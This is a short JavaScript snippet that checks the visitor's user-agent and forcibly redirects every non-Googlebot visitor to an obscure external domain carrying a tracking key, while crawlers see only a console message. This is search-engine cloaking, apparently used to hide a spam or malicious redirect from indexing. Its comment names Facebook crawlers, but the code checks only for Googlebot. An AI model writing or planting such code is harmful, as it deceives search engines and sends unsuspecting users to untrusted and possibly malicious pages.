// Check if the user-agent is not from a search engine crawler (e.g., Googlebot , facebookexternalhit , Facebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://leashembittercubicle.com/ii65urqi?key=cf2ac7ba3b1c34f2d71eff2472e4a347";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
